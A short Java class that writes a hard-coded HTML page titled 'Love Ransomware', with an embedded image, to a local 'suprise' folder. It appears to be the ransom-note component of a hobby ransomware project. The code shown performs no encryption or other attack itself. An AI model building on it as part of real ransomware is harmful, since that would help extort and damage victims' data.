package src_pack;
import java.io.*;
import java.util.*;

public class creat_web {
	
	public creat_web() throws IOException{
		String web_source = "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Who am I</title></head><body bgcolor=\"black\"><center><font color=white><h1>&#9829; Love Ransomware &#9829;</h1></center></font><center><img src=\"http://cdn.namuwikiusercontent.com/c9/c91a9c2e000a8b26166c9b01fa9dc27868d8ea05c2db80cf8f4db6ee509f9032.jpg?e=1491638160&k=q4kAeEl8D848nSFcnWj5aw\" width=\"900\" height=\"550\"></a></center></body></html>";
		
		FileWriter write_web = new FileWriter("./suprise/hello.html");
		
		write_web.write(web_source);
		
		write_web.close();
	}

}
